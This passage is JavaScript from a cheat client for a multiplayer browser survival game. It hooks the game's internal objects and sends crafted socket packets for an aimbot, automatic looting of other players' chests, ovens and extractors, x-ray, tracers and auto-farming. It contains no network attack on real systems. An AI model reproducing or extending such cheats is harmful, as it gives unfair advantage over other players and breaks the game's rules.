					disableAndHide(Settings.ColoredSpikes);
					disableAndHide(Settings.PlayerOnTop);
					disableAndHide(Settings.BoxOnTop);
					disableAndHide(Settings.ChestInfo);
					disableAndHide(Settings.BoxInfo);
					disableAndHide(Settings.TotemInfo);
					disableAndHide(Settings.WeatherInfo);
					disableAndHide(Settings.ShowJoinLeaves);
					disableAndHide(Settings.ExtractorInfo);
					disableAndHide(Settings.ShowHP);
					disableAndHide(Settings.Timers);
					disableAndHide(Settings.ListEnabledHacks);
					disableAndHide(Settings.Roofs);
					disableAndHide(Settings.NoFog);
					disableAndHide(Settings.Xray);
					disableAndHide(Settings.OvenInfo);
					disableAndHide(Settings.WindmillInfo);
					disableAndHide(Settings.FurnaceInfo);
					disableAndHide(Settings.ShowLevel);
					disableAndHide(Settings.Death);
					disableAndHide(Settings.Totem);
					disableAndHide(Settings.Equip);
					disableAndHide(Settings.GhostInfo);
					break;
				case false:
					enableAndShow(Settings.VehicleOpacity);
					enableAndShow(Settings.ShowLevel);
					enableAndShow(Settings.MachineInfo);
					enableAndShow(Settings.LBscore);
					enableAndShow(Settings.ShowHoodNames);
					enableAndShow(Settings.ColoredSpikes);
					enableAndShow(Settings.PlayerOnTop);
					enableAndShow(Settings.BoxOnTop);
					enableAndShow(Settings.ChestInfo);
					enableAndShow(Settings.BoxInfo);
					enableAndShow(Settings.TotemInfo);
					enableAndShow(Settings.WeatherInfo);
					enableAndShow(Settings.ExtractorInfo);
					enableAndShow(Settings.ShowJoinLeaves);
					enableAndShow(Settings.ShowHP);
					enableAndShow(Settings.Timers);
					enableAndShow(Settings.ListEnabledHacks);
					enableAndShow(Settings.Roofs);
					enableAndShow(Settings.NoFog);
					enableAndShow(Settings.Xray);
					enableAndShow(Settings.PlayerTracers);
					enableAndShow(Settings.KrakenTracers);
					enableAndShow(Settings.SandwormTracers);
					enableAndShow(Settings.OvenInfo);
					enableAndShow(Settings.WindmillInfo);
					enableAndShow(Settings.FurnaceInfo);
					enableAndShow(Settings.Death);
					enableAndShow(Settings.Totem);
					enableAndShow(Settings.Equip);
					enableAndShow(Settings.GhostInfo);
					break;
				default:
					break;
			}
		
			function disableAndHide(setting) {
				if (setting && setting.enabled) {
					setting.enabled = false;
					setting.hide = true;
				}
			}
		
			function enableAndShow(setting) {
				if (setting && setting.hide) {
					setting.enabled = true;
					setting.hide = false;
				}
			}
		}
		

		function getGearRange(gear) {
			switch (gear) {
				case 57:
				case 0:
				case 5:
				case 6:
				case 30:
				case 19:
				case 62:
				case 63:
				case 22:
					return 140;
				case 12:
				case 13:
				case 14:
				case 15:
				case 33:
				case 34:
				case 18:
				case 16:
				case 17:
					return 200;
				case 9:
					return 150;
				default:
					return null
			}
		}

		function distance(a, b) {
			return Math.sqrt((b.x - a.x) * (b.x - a.x) + (b.y - a.y) * (b.y - a.y))
		}

		function findTarget(a, b, dist) {
			for (const p of b) {
				if (!isAlly(p) && distance(a, p) <= dist && (p.ΔⵠΔⲆΔᐃᐃ && a.ΔⵠΔⲆΔᐃᐃ || !p.ΔⵠΔⲆΔᐃᐃ && !a.ΔⵠΔⲆΔᐃᐃ)) {
					return p
				}
			}
		}

		function selectTool(tool1, tool2, me, socket) {
			if (canSelect(tool1)) {
				if (me.right !== tool1) socket.send(JSON.stringify([Packets.Equip, tool1]))
			} else if (canSelect(tool2)) {
				if (me.right !== tool2) socket.send(JSON.stringify([Packets.Equip, tool2]))
			}
		}

		function autoFeed() {
			if (!autoFeedReady) return;
			const stamp = Date.now();
			if (Settings.AutoFeed.enabled && stamp - Stamps.AutoFeed > 80 && getClientProperty("socket")) {
				const keys = Object.keys(getUserProperty("gauges"));
				const hunger = getUserProperty("gauges")[keys[2]];
				const thirst = getUserProperty("gauges")[keys[3]];
				if (hunger <= .6) {
					const foodToEat = [110, 117, 189, 205, 207, 192].find((food => canSelect(food)));
					foodToEat && getClientProperty("socket").send(JSON.stringify([Packets.Equip, foodToEat]))
				}
				if (thirst <= .5 && canSelect(127)) getClientProperty("socket").send(JSON.stringify([Packets.Equip, 127]));
				Stamps.AutoFeed = stamp;
				autoFeedReady = false;
				setTimeout((() => autoFeedReady = true), 500)
			}
		}
		setInterval(autoFeed, 500);

		function angleCalculator(a, b) {
			if (a + b > 254) {
				var angle = a + b - 254
			}
			if (a + b < 0) {
				var angle = 254 + (a + b)
			}
			if (a + b >= 0 && a + b < 254) {
				var angle = a + b
			}
			return angle
		}

		function calcAngle(e, o, i) {
			return e && o ? i ? Math.atan2(o.r.y - e.r.y, o.r.x - e.r.x) : Math.atan2(o.y - e.y, o.x - e.x) : null
		}

		function isAlly(p) {
			return p.pid === getUserProperty("id") || getUserProperty("team").includes(p.pid)
		}
			function initRespawn(){
			if (!window.mapping || !window.client)
				return;
			window.a = Object.keys(client)[137];
			window.b = Object.keys(client)[136];
			window.c = Object.keys(mapping)[85];
			window.gg = client[a];
			}   

		function getUserProperty(property) {
			const user = window.user;
			if (!user) return null;
			const keys = Object.keys(user);
			const indexes = {
				terminal: 42,
				chat: 43,
				uid: 17,
				team: 21,
				id: 16,
				cam: 28,
				alive: 10,
				inventory: 35,
				gauges: 30,
				ghost: 8,
				preview: 38
			};
			return user[keys[indexes[property]]]
		}
		window.getUserProperty = getUserProperty;

		function getWorldProperty(property) {
			const world = window.world;
			if (!world) return null;
			const keys = Object.keys(world);
			const indexes = {
				units: 5,
				fast_units: 6,
				players: 4
			};
			return world[keys[indexes[property]]]
		}
		window.getWorldProperty = getWorldProperty;

		function getKeyboardProperty(property) {
			const keyboard = window.keyboard;
			if (!keyboard) return null;
			const keys = Object.keys(keyboard);
			const indexes = {
				left: 31,
				right: 32,
				bottom: 34,
				top: 33
			};
			return keyboard[keys[indexes[property]]]
		}

		function getClientProperty(property) {
			const client = window.client;
			if (!client) return null;
			const keys = Object.keys(client);
			const indexes = {
				socket: 0,
				select_craft: 96,
				recycle_inv: 116,
				steal_token: 137,
				send_move: 123
			};
			return client[keys[indexes[property]]]
		}

		function setKeybind(property) {
			if (!Settings[property] || !Settings[property].key) return;
			Settings[property].key = "Press Any Key";

			function setBind(event) {
				event.code === "Escape" ? Settings[property].key = "NONE" : Settings[property].key = event.code;
				saveSettings();
				document.removeEventListener("keydown", setBind)
			}
			document.addEventListener("keydown", setBind)
		}

		function initListeners() {
			document.addEventListener("keydown", (event => {
				if (getUserProperty("chat").open || getUserProperty("terminal").open) return;
				if (getUserProperty("alive")) {
					for (const property in Settings) {
						if (event.code === Settings[property].key && Settings[property].keyMode === "hold") {
							Settings[property].enabled = true
						}
					}
				}
			}));
			document.addEventListener("keyup", (event => {
				if (getUserProperty("chat").open || getUserProperty("terminal").open) return;
				if (getUserProperty("alive")) {
					for (const property in Settings) {
						if (event.code === Settings[property].key && Settings[property].keyMode === "hold") {
							Settings[property].enabled = false
						}
					}
				}
			}));
			document.addEventListener("keypress", (event => {
				if (getUserProperty("chat").open || getUserProperty("terminal").open) return;
				if (getUserProperty("alive")) {
					for (const property in Settings) {
						if (event.code === Settings[property].key && Settings[property].keyMode === "press") {
							Settings[property].enabled = !Settings[property].enabled;
							if (property === "Spectator" && !Settings[property].enabled && getClientProperty("socket")) getClientProperty("socket").send(JSON.stringify([Packets.Focus]))
						}
					}
				}
																	if (event.code === Settings.HideGUI.key) {
			HideGUI(Settings.HideGUI.enabled)
			}
			if (event.code === Settings.GoToLobby.key) {
				getClientProperty("steal_token") && getClientProperty("steal_token").bind(window.client)()	
			}
			}))
		}

		function initEngine() {
			requestAnimationFrame(initEngine);
			if (getUserProperty("alive") && getClientProperty("socket")) {
				if (Settings.Spectator.enabled) {
					if (getKeyboardProperty("left").bind(window.keyboard)()) getUserProperty("cam").x += Settings.Spectator.speed * 100;
					if (getKeyboardProperty("right").bind(window.keyboard)()) getUserProperty("cam").x -= Settings.Spectator.speed * 100;
					if (getKeyboardProperty("bottom").bind(window.keyboard)()) getUserProperty("cam").y -= Settings.Spectator.speed * 100;
					if (getKeyboardProperty("top").bind(window.keyboard)()) getUserProperty("cam").y += Settings.Spectator.speed * 100
				}
				if (getWorldProperty("fast_units")[getUserProperty("uid")]) {
					const stamp = Date.now();
					if (Settings.AutoTotem.enabled && stamp - Stamps.AutoTotem > 60 && getUserProperty("team").length == 0) {
						getWorldProperty("units")[29].forEach((totem => {
							if (distance(totem, getWorldProperty("fast_units")[getUserProperty("uid")]) <= 300) {
								getClientProperty("socket").send(JSON.stringify([Packets.JoinTeam, totem.pid, totem.id]))
							}
						}));
						Stamps.AutoTotem = stamp
					}
					if (Settings.AutoCraft.enabled && stamp - Stamps.AutoCraft > 80 && Settings.AutoCraft.last !== null) {
						getClientProperty("select_craft").bind(window.client)(Settings.AutoCraft.last);
						Stamps.AutoCraft = stamp
					}
					if (Settings.ZMA.enabled &&stamp - Stamps.ZMA > 90) { // gotta do if invhas to avoid reconnecting
							getWorldProperty("units")[11].forEach((chest => {
								if (distance(chest, getWorldProperty("fast_units")[getUserProperty("uid")]) <= 300 ) {
							getClientProperty("socket").send(JSON.stringify([1,202,255,chest.pid, chest.id])); 
							getClientProperty("socket").send(JSON.stringify([1,111,255,chest.pid, chest.id])); 
								}
							}
							
							))
							Stamps.ZMA = stamp;

						}
														if (Settings.crownHeal.enabled && canSelect(77)) {
							if (stamp - Stamps.crownHeal > 900) {
								const me = getWorldProperty("fast_units")[getUserProperty("uid")]
								if (~~(11 - (Date.now() - Timers.HealTimer) / 1e3) == 1 && ᐃᐃΔ.ⲆΔⲆⵠ.ⲆⲆⵠΔ * 200 <= 160 && me.Ⲇⵠᐃᐃᐃ != 77) {
									const lastClothe = me.Ⲇⵠᐃᐃᐃ == 77 ? undefined : me.Ⲇⵠᐃᐃᐃ;
									getClientProperty("socket").send(JSON.stringify([Packets.Equip, 77]));
									if (lastClothe) setTimeout((() => getClientProperty("socket").send(JSON.stringify([Packets.Equip, lastClothe]))), 800)
								}
								Stamps.crownHeal = stamp
							}
						}
						if (Settings.BottleHeal.enabled &&stamp - Stamps.BottleHeal > 100) {
							getClientProperty("socket").send(JSON.stringify([34,127])); 
							Stamps.BottleHeal = stamp;
						}
					if (Settings.AutoRecycle.enabled && stamp - Stamps.AutoRecycle > 80 && Settings.AutoRecycle.last !== null) {
						getClientProperty("recycle_inv").bind(window.client)(Settings.AutoRecycle.last);
						Stamps.AutoRecycle = stamp
					}
					if (Settings.AutoWall.enabled && stamp - Stamps.AutoWall > 80 && canSelect(162)) {
						getClientProperty("socket").send(JSON.stringify([Packets.SendBuild, 162, Math.floor(255 * ((getWorldProperty("fast_units")[getUserProperty("uid")].angle + Math.PI * 2) % (Math.PI * 2)) / (Math.PI * 2)), 0]));
						if (Settings.AutoWall.mode) {
							for (let i = 0; i < 24; i += 2) {
								getClientProperty("socket").send(JSON.stringify([Packets.SendBuild, 162, angleCalculator(Math.floor(255 * ((getWorldProperty("fast_units")[getUserProperty("uid")].angle + Math.PI * 2) % (Math.PI * 2)) / (Math.PI * 2)), i), 0]));
								getClientProperty("socket").send(JSON.stringify([Packets.SendBuild, 162, angleCalculator(Math.floor(255 * ((getWorldProperty("fast_units")[getUserProperty("uid")].angle + Math.PI * 2) % (Math.PI * 2)) / (Math.PI * 2)), -i), 0]))
							}
						}
						Stamps.AutoWall = stamp
					}
					if (Settings.AutoFire.enabled && stamp - Stamps.AutoFire > 80) {
						if (canSelect(113)) {
							getClientProperty("socket").send(JSON.stringify([Packets.SendBuild, 113, Math.floor(255 * ((getWorldProperty("fast_units")[getUserProperty("uid")].angle + Math.PI * 2) % (Math.PI * 2)) / (Math.PI * 2)), 0]))
						} else if (canSelect(118)) {
							getClientProperty("socket").send(JSON.stringify([Packets.SendBuild, 118, Math.floor(255 * ((getWorldProperty("fast_units")[getUserProperty("uid")].angle + Math.PI * 2) % (Math.PI * 2)) / (Math.PI * 2)), 0]))
						}
						Stamps.AutoFire = stamp
					}
					if (Settings.AutoIce.enabled && stamp - Stamps.AutoIce > 200 && canSelect(142)) {
						const keys = Object.keys(getUserProperty("gauges"));
						const warm = getUserProperty("gauges")[keys[5]];
						if (warm <= .4) getClientProperty("socket").send(JSON.stringify([Packets.Equip, 142]));
						Stamps.AutoIce = stamp
					}
					if (Settings.DropSword.enabled && stamp - Stamps.DropSword > 80 && getWorldProperty("fast_units")[getUserProperty("uid")].right !== undefined && getGearRange(getWorldProperty("fast_units")[getUserProperty("uid")].right) !== null) {
						getClientProperty("socket").send(JSON.stringify([Packets.DropAll, getWorldProperty("fast_units")[getUserProperty("uid")].right]));
						Stamps.DropSword = stamp
					}
					if (Settings.AutoBuild.enabled && stamp - Stamps.AutoBuild > 60) {
						if (Settings.AutoBuild.build === "Roofs" && canSelect(190)) {
							getClientProperty("socket").send(JSON.stringify([Packets.SendBuild, 190, Math.floor(255 * ((getWorldProperty("fast_units")[getUserProperty("uid")].angle + Math.PI * 2) % (Math.PI * 2)) / (Math.PI * 2)), 1]))
						} else if (Settings.AutoBuild.build === "Bridges" && canSelect(125)) {
							getClientProperty("socket").send(JSON.stringify([Packets.SendBuild, 125, Math.floor(255 * ((getWorldProperty("fast_units")[getUserProperty("uid")].angle + Math.PI * 2) % (Math.PI * 2)) / (Math.PI * 2)), 1]))
						} else if (Settings.AutoBuild.build === "Plots" && canSelect(141)) {
							getClientProperty("socket").send(JSON.stringify([Packets.SendBuild, 141, Math.floor(255 * ((getWorldProperty("fast_units")[getUserProperty("uid")].angle + Math.PI * 2) % (Math.PI * 2)) / (Math.PI * 2)), 1]))
						}
						Stamps.AutoBuild = stamp
					}
					if (Settings.AutoSeed.enabled && stamp - Stamps.AutoSeed > 80) {
						switch (Settings.AutoSeed.seed) {
							case "Auto":
								const seeds = [115, 132, 188, 204, 206, 193, 210, 191, 208];
								for (const seed of seeds)
									if (canSelect(seed)) var seedId = seed;
								break;
							case "Berry":
								if (canSelect(115)) var seedId = 115;
								break;
							case "Wheat":
								if (canSelect(132)) var seedId = 132;
								break;
							case "Pumpkin":
								if (canSelect(188)) var seedId = 188;
								break;
							case "Thornbush":
								if (canSelect(193)) var seedId = 193;
								break;
							case "Aloe":
								if (canSelect(210)) var seedId = 210;
								break;
							case "Watermelon":
								if (canSelect(208)) var seedId = 208;
								break;
							case "Garlic":
								if (canSelect(191)) var seedId = 191;
								break;
							case "Carrot":
								if (canSelect(204)) var seedId = 204;
								break;
							case "Tomato":
								if (canSelect(206)) var seedId = 206;
								break
						}
						if (seedId) {
							getClientProperty("socket").send(JSON.stringify([Packets.SendBuild, seedId, Math.floor(255 * ((getWorldProperty("fast_units")[getUserProperty("uid")].angle + Math.PI * 2) % (Math.PI * 2)) / (Math.PI * 2)), Settings.AutoSeedG ? 1 : 0]))
						}
						Stamps.AutoSeed = stamp
					}
					if (Settings.AutoSteal.enabled && stamp - Stamps.AutoSteal > 40) {
						getWorldProperty("units")[11].forEach((chest => {
							if (distance(chest, getWorldProperty("fast_units")[getUserProperty("uid")]) <= 300 && chest.action) {
								if (chest.lock && Settings.AutoUnlock && !isAlly(chest) && canSelect(158)) getClientProperty("socket").send(JSON.stringify([Packets.UnlockChest, chest.pid, chest.id]));
								getClientProperty("socket").send(JSON.stringify([Packets.TakeChest, chest.pid, chest.id]))
							}
						}));
						getWorldProperty("units")[34].forEach((oven => {
							if ((oven.info & 31744) >> 10 && distance(oven, getWorldProperty("fast_units")[getUserProperty("uid")]) <= 300) {
								getClientProperty("socket").send(JSON.stringify([Packets.TakeOven, oven.pid, oven.id]))
							}
						}));
						getWorldProperty("units")[32].forEach((windmill => {
							if ((windmill.info & 65280) >> 8 && distance(windmill, getWorldProperty("fast_units")[getUserProperty("uid")]) <= 300) {
								getClientProperty("socket").send(JSON.stringify([Packets.TakeWindmill, windmill.pid, windmill.id]))
							}
						}));
						const extractors = [getWorldProperty("units")[24], getWorldProperty("units")[25], getWorldProperty("units")[26], getWorldProperty("units")[27], getWorldProperty("units")[28]];
						for (let ex = 0; ex < extractors.length; ex++) {
							extractors[ex].forEach((extractor => {
								if ((extractor.info & 65280) >> 8 && distance(extractor, getWorldProperty("fast_units")[getUserProperty("uid")]) <= 300) {
									getClientProperty("socket").send(JSON.stringify([Packets.TakeExtractor, extractor.pid, extractor.id, extractor.type]))
								}
							}))
						}
						Stamps.AutoSteal = stamp
					}
					if (Settings.AutoExtractorTake.enabled && stamp - Stamps.AutoExtractorTake > 50) {
						const extractors = [getWorldProperty("units")[24], getWorldProperty("units")[25], getWorldProperty("units")[26], getWorldProperty("units")[27], getWorldProperty("units")[28]];
						for (let ex = 0; ex < extractors.length; ex++) {
							extractors[ex].forEach((extractor => {
								if ((extractor.info & 65280) >> 8 && distance(extractor, getWorldProperty("fast_units")[getUserProperty("uid")]) <= 300) {
									getClientProperty("socket").send(JSON.stringify([Packets.TakeExtractor, extractor.pid, extractor.id, extractor.type]))
								}
							}))
						}
						Stamps.AutoExtractorTake = stamp
					}
					if (Settings.AutoExtractorPut.enabled && stamp - Stamps.AutoExtractorPut > 250) {
						const extractors = [getWorldProperty("units")[24], getWorldProperty("units")[25], getWorldProperty("units")[26], getWorldProperty("units")[27], getWorldProperty("units")[28]];
						for (let ex = 0; ex < extractors.length; ex++) {
							extractors[ex].forEach((extractor => {
								if ((extractor.info & 255) !== Settings.AutoExtractorPutMax && distance(extractor, getWorldProperty("fast_units")[getUserProperty("uid")]) <= 300) {
									getClientProperty("socket").send(JSON.stringify([Packets.PutExtractor, Settings.AutoExtractorPutMax - (extractor.info & 255), extractor.pid, extractor.id, extractor.type]))
								}
							}))
						}
						Stamps.AutoExtractorPut = stamp
					}
					if (Settings.AutoBreadTake.enabled && stamp - Stamps.AutoBreadTake > 80) {
						getWorldProperty("units")[34].forEach((oven => {
							if ((oven.info & 31744) >> 10 && distance(oven, getWorldProperty("fast_units")[getUserProperty("uid")]) <= 300) {
								getClientProperty("socket").send(JSON.stringify([Packets.TakeOven, oven.pid, oven.id]))
							}
						}));
						getWorldProperty("units")[32].forEach((windmill => {
							if ((windmill.info & 65280) >> 8 && distance(windmill, getWorldProperty("fast_units")[getUserProperty("uid")]) <= 300) {
								getClientProperty("socket").send(JSON.stringify([Packets.TakeWindmill, windmill.pid, windmill.id]))
							}
						}));
						Stamps.AutoBreadTake = stamp
					}
					if (Settings.AutoBreadPut.enabled && stamp - Stamps.AutoBreadPut > 250) {
						getWorldProperty("units")[34].forEach((oven => {
							if ((oven.info & 31) !== Settings.BreadPutMax && distance(oven, getWorldProperty("fast_units")[getUserProperty("uid")]) <= 300) {
								getClientProperty("socket").send(JSON.stringify([Packets.GiveWoodOven, Settings.BreadPutMax - (oven.info & 31), oven.pid, oven.id]))
							}
							if ((oven.info & 992) >> 5 !== Settings.BreadPutMax && distance(oven, getWorldProperty("fast_units")[getUserProperty("uid")]) <= 300) {
								getClientProperty("socket").send(JSON.stringify([Packets.GiveFlourOven, Settings.BreadPutMax - ((oven.info & 992) >> 5), oven.pid, oven.id]))
							}
						}));
						getWorldProperty("units")[32].forEach((windmill => {
							if ((windmill.info & 255) !== Settings.WindmillPutMax && distance(windmill, getWorldProperty("fast_units")[getUserProperty("uid")]) <= 300) {
								getClientProperty("socket").send(JSON.stringify([Packets.GiveWheatWindmill, Settings.WindmillPutMax - (windmill.info & 255), windmill.pid, windmill.id]))
							}
						}));
						Stamps.AutoBreadPut = stamp
					}
					if (Settings.AutoCrown.enabled && getUserProperty("ghost").enabled && stamp - Stamps.AutoCrown > 80) {
						getWorldProperty("units")[22].forEach((resurrection => {
							if (distance(resurrection, getWorldProperty("fast_units")[getUserProperty("uid")]) <= 300) {
								getClientProperty("socket").send(JSON.stringify([Packets.Resurrection, resurrection.pid, resurrection.id]))
							}
						}));
						Stamps.AutoCrown = stamp
					}
					if (Settings.AimBot.enabled && getWorldProperty("fast_units")[getUserProperty("uid")].right !== undefined) {
						const range = getGearRange(getWorldProperty("fast_units")[getUserProperty("uid")].right);
						if (range !== null) {
							const target = findTarget(getWorldProperty("fast_units")[getUserProperty("uid")], getWorldProperty("units")[0], range);
							if (target) {
								Settings.AimBot.angle = calcAngle(getWorldProperty("fast_units")[getUserProperty("uid")], target, true);
								getClientProperty("socket").send(JSON.stringify([Packets.SendAttack, Math.floor((Settings.AimBot.angle + Math.PI * 2) % (Math.PI * 2) * 255 / (Math.PI * 2))]));
								getClientProperty("socket").send(JSON.stringify([Packets.StopAttack]))
							} else Settings.AimBot.angle = null
						} else Settings.AimBot.angle = null
					}
					if (Settings.SmartCraft.enabled && stamp - Stamps.AutoCraft > 90) {
						switch (Settings.SmartCraft.select) {
							case "REIDITE_SPIKE":
								var craftIds = [55, 56, 57, 58, 59, 60, 72];
								var checkId = 219;
								break;
							case "AMETHYST_SPIKE":
								var craftIds = [55, 56, 57, 58, 59, 71];
								var checkId = 123;
								break;
							case "DIAMOND_SPIKE":
								var craftIds = [55, 56, 57, 58, 70];
								var checkId = 170;
								break;
							case "GOLD_SPIKE":
								var craftIds = [55, 56, 57, 69];
								var checkId = 169;
								break;
							case "STONE_SPIKE":
								var craftIds = [55, 56, 68];
								var checkId = 168;
								break;
							case "REIDITE_WALL":
								var craftIds = [55, 56, 57, 58, 59, 60];
								var checkId = 217;
								break;
							case "AMETHYST_WALL":
								var craftIds = [55, 56, 57, 58, 59];
								var checkId = 122;
								break;
							case "DIAMOND_WALL":
								var craftIds = [55, 56, 57, 58];
								var checkId = 165;
								break;
							case "GOLD_WALL":
								var craftIds = [55, 56, 57];
								var checkId = 164;
								break;
							case "STONE_WALL":
								var craftIds = [55, 56];
								var checkId = 163;
								break
						}
						if (craftIds && checkId) {
							const amount = getUserProperty("inventory")[Object.keys(getUserProperty("inventory"))[3]][checkId];
							if (amount === undefined || amount < Settings.SmartCraft.hm) {
								for (const craftId of craftIds.reverse()) {
									getClientProperty("socket").send(JSON.stringify([Packets.Craft, craftId]))
								}
							}
						}
						Stamps.AutoCraft = stamp
					}
					if (Settings.AutoSpike.enabled && stamp - Stamps.AutoSpike > 90) {
						for (const spike of Settings.AutoSpike.priority) {
							if (spike === "Reidite Spike" && canSelect(219)) {
								var bestSpike = 219;
								break
							} else if (spike === "Amethyst Spike" && canSelect(123)) {
								var bestSpike = 123;
								break
							} else if (spike === "Diamond Spike" && canSelect(170)) {
								var bestSpike = 170;
								break
							} else if (spike === "Gold Spike" && canSelect(169)) {
								var bestSpike = 169;
								break
							} else if (spike === "Stone Spike" && canSelect(168)) {
								var bestSpike = 168;
								break
							} else if (spike === "Wood Spike" && canSelect(160)) {
								var bestSpike = 160;
								break
							} else if (spike === "Wood Wall" && canSelect(162)) {
								var bestSpike = 162;
								break
							}
						}
						if (bestSpike) {
							getClientProperty("socket").send(JSON.stringify([Packets.SendBuild, bestSpike, Math.floor(255 * ((getWorldProperty("fast_units")[getUserProperty("uid")].angle + Math.PI * 2) % (Math.PI * 2)) / (Math.PI * 2)), 0]));
							if (Settings.AutoSpike.mode) {
								for (let i = 0; i < 30; i += 2) {
									getClientProperty("socket").send(JSON.stringify([Packets.SendBuild, bestSpike, angleCalculator(Math.floor(255 * ((getWorldProperty("fast_units")[getUserProperty("uid")].angle + Math.PI * 2) % (Math.PI * 2)) / (Math.PI * 2)), i), 0]));
									getClientProperty("socket").send(JSON.stringify([Packets.SendBuild, bestSpike, angleCalculator(Math.floor(255 * ((getWorldProperty("fast_units")[getUserProperty("uid")].angle + Math.PI * 2) % (Math.PI * 2)) / (Math.PI * 2)), -i), 0]))
								}
							}
						}
						Stamps.AutoSpike = stamp
					}
					if (Settings.AutoFarm.enabled && stamp - Stamps.AutoFarm > 400) {
						const Targeta = {
							obj: null,
							dist: -1,
							type: 0
						};
						const rect1 = {
							x: Settings.AutoFarm.x,
							y: Settings.AutoFarm.y,
							width: Settings.AutoFarm.xx - Settings.AutoFarm.x,
							height: Settings.AutoFarm.yy - Settings.AutoFarm.y
						};
						for (let i = 0, objects = [...getWorldProperty("units")[37], ...getWorldProperty("units")[3], ...getWorldProperty("units")[31], ...getWorldProperty("units")[40], ...getWorldProperty("units")[39], ...getWorldProperty("units")[44], ...getWorldProperty("units")[55], ...getWorldProperty("units")[54], ...getWorldProperty("units")[43]], Berry = null, d = null; i < objects.length; ++i) {
							Berry = objects[i];
							if (!Berry.info || Berry.info === 10) continue;
							if (!Settings.AutoFarm.water && Berry.info === 16) continue;
							if (rect1.x < Berry.x - 50 + 100 && rect1.x + rect1.width > Berry.x - 50 && rect1.y < Berry.y - 50 + 100 && rect1.y + rect1.height > Berry.y - 50) {
								d = (getWorldProperty("fast_units")[getUserProperty("uid")].x - Berry.x) ** 2 + (getWorldProperty("fast_units")[getUserProperty("uid")].y - Berry.y) ** 2;
								if (Targeta.dist === -1 || d < Targeta.dist) {
									Targeta.dist = d;
									Targeta.obj = Berry
								}
							}
						}
						if (Targeta.obj) {
							Targeta.dist = distance(Targeta.obj, getWorldProperty("fast_units")[getUserProperty("uid")]);
							switch (Targeta.obj.info) {
								case 1:
								case 2:
								case 3: {
									selectTool(54, 53, getWorldProperty("fast_units")[getUserProperty("uid")], getClientProperty("socket"));
									Targeta.type = 2
								};
								break;
							case 16:
							case 17:
							case 18:
							case 19: {
								if (Settings.AutoFarm.water && canSelect(49) && getWorldProperty("fast_units")[getUserProperty("uid")].right !== 49) {
									getClientProperty("socket").send(JSON.stringify([Packets.Equip, 49]));
									Targeta.type = 1
								} else {
									selectTool(54, 53, getWorldProperty("fast_units")[getUserProperty("uid")], getClientProperty("socket"));
									Targeta.type = 2
								}
							};
							break
							}
							let velocity = 0;
							const Coors = {
								x: getWorldProperty("fast_units")[getUserProperty("uid")].x - Targeta.obj.x,
								y: getWorldProperty("fast_units")[getUserProperty("uid")].y - Targeta.obj.y
							};
							const CoorsABS = {
								x: Math.abs(getWorldProperty("fast_units")[getUserProperty("uid")].x - Targeta.obj.x),
								y: Math.abs(getWorldProperty("fast_units")[getUserProperty("uid")].y - Targeta.obj.y)
							};
							if (CoorsABS.x > 0) {
								if (Coors.x > 0) velocity += 1;
								if (Coors.x < 0) velocity += 2
							}
							if (CoorsABS.y > 0) {
								if (Coors.y > 0) velocity += 8;
								if (Coors.y < 0) velocity += 4
							}
							if (CoorsABS.x < 250 && CoorsABS.y < 250) {
								Settings.AutoFarm.angle = calcAngle(getWorldProperty("fast_units")[getUserProperty("uid")], Targeta.obj, true);
								if (Settings.AutoFarm.angle) {
									getClientProperty("socket").send(JSON.stringify([Packets.SendAttack, Math.floor((Settings.AutoFarm.angle + Math.PI * 2) % (Math.PI * 2) * 255 / (Math.PI * 2))]));
									getClientProperty("socket").send(JSON.stringify([Packets.StopAttack]))
								}
							}
							getClientProperty("send_move").bind(window.client)(velocity)
						} else {
							let velocity = 0;
							const Coors = {
								x: getWorldProperty("fast_units")[getUserProperty("uid")].x - Settings.AutoFarm.sx,
								y: getWorldProperty("fast_units")[getUserProperty("uid")].y - Settings.AutoFarm.sy
							};
							const CoorsABS = {
								x: Math.abs(getWorldProperty("fast_units")[getUserProperty("uid")].x - Settings.AutoFarm.sx),
								y: Math.abs(getWorldProperty("fast_units")[getUserProperty("uid")].y - Settings.AutoFarm.sy)
							};
							if (CoorsABS.x > 100) {
								if (Coors.x > 0) velocity += 1;
								if (Coors.x < 0) velocity += 2
							}
							if (CoorsABS.y > 100) {
								if (Coors.y > 0) velocity += 8;
								if (Coors.y < 0) velocity += 4
							}
							getClientProperty("send_move").bind(window.client)(velocity)
						}
						Stamps.AutoFarm = stamp
					}
				}
			}
		}

		function initExclusive() {
				document.querySelector("#option_in_game").style.opacity = "0.5";
				document.querySelector("#chronoquest").style.opacity = "0.5";
				document.querySelector("#shop_market").style.opacity = "0.5";
				document.querySelector("#home_craft").style.opacity = "0.5";
				document.querySelector("#recipe_craft").style.opacity = "0.5";
				document.querySelector("#sure_delete").style.opacity = "0.5";
				document.querySelector("#cancel_sure_delete").style.opacity = "0.5";
			const gui = new guify({
				title: "snowfall",
				align: "right",
				width: 600,
				opacity: .67,
				barMode: "none",
				theme: {
					colors: {
						panelBackground: "rgb(0,0,0)",
						componentBackground: "rgb(10,10,35)",
						componentForeground: "rgb(0,255,0)",
						textPrimary: "rgb(0,255,0)",
						textSecondary: "rgb(0,255,0)",
						textHover: "rgb(0,0,0)"
					},
					font: {
						fontFamily: "Baloo Paaji",
						fontSize: "20px"
					}
				}
			});
			gui.Register([{
				type: "folder",
				label: "Visuals",
				open: false
			}, {
				type: "folder",
				label: "Misc",
				open: false
			}, {
				type: "folder",
				label: "Binds",
				open: false
			}, {
				type: "folder",
				label: "AutoSteal",
				open: false
			}, {
				type: "folder",
				label: "AutoSpike",
				open: false
			}, {
				type: "folder",
				label: "SmartCraft",
				open: false
			}, {
				type: "folder",
				label: "Spectator",
				open: false
			}, {
				type: "folder",
				label: "AutoFarm",
				open: false
			},
			{
				type: "folder",
				label: "Extras",
				open: false,
			}
			]);
			gui.Register([{
				type: "checkbox",
				label: "PlayerTracers",
				object: Settings.PlayerTracers,
				property: "enabled",
				onChange() {
					saveSettings()
				}
			}, {
				type: "checkbox",
				label: "KrakenTracers",
				object: Settings.KrakenTracers,
				property: "enabled",
				onChange() {
					saveSettings()
				}
			}, {
				type: "checkbox",
				label: "SandwormTracers",
				object: Settings.SandwormTracers,
				property: "enabled",
				onChange() {
					saveSettings()
				}
			}, {
				type: "checkbox",
				label: "PlayerOnTop",
				object: Settings.PlayerOnTop,
				property: "enabled",
				onChange() {
					saveSettings()
				}
			}, {
				type: "checkbox",
				label: "BoxOnTop",
				object: Settings.BoxOnTop,
				property: "enabled",
				onChange() {
					saveSettings()
				}
			}, {
				type: "checkbox",
				label: "ListEnabledHacks",
				object: Settings.ListEnabledHacks,
				property: "enabled",
				onChange() {
					saveSettings()
				}
			}, {
				type: "checkbox",
